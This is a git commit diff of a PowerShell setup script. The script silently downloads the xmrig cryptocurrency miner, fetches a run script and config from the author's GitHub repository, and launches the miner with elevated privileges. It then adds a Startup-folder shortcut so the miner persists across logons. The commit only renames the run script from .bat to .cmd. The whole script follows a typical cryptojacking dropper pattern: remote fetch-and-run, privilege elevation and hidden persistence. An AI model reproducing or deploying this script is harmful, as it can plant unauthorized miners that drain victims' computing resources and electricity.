bef3a1c663ad77510de267a4a33006d2381b80c8
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-07 16:18:32 +0700

    XRPSETUP.ps1

--- XRPSETUP.ps1
+++ XRPSETUP.ps1
@@ -5,13 +5,13 @@ Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs
 Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip
 & 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'
 Start-Sleep -Seconds 3
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPRUN.bat -OutFile C:\XRPRUN.bat
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPRUN.cmd -OutFile C:\XRPRUN.cmd
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/config.json -OutFile C:\config.json
-Copy-Item -Path C:\XRPRUN.bat -Destination C:\xmrig-6.22.2\XRPRUN.bat -Force
+Copy-Item -Path C:\XRPRUN.cmd -Destination C:\xmrig-6.22.2\XRPRUN.cmd -Force
 Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force
-Start-Process -FilePath 'C:\xmrig-6.22.2\XRPRUN.bat' -ArgumentList '/S' -Verb RunAs
-$source = "C:\xmrig-6.22.2\XRPRUN.bat"
-$destination = "C:\Users\1111\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XRPRUN.bat.lnk"
+Start-Process -FilePath 'C:\xmrig-6.22.2\XRPRUN.cmd' -ArgumentList '/S' -Verb RunAs
+$source = "C:\xmrig-6.22.2\XRPRUN.cmd"
+$destination = "C:\Users\1111\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XRPRUN.cmd.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($destination)
 $shortcut.TargetPath = $source
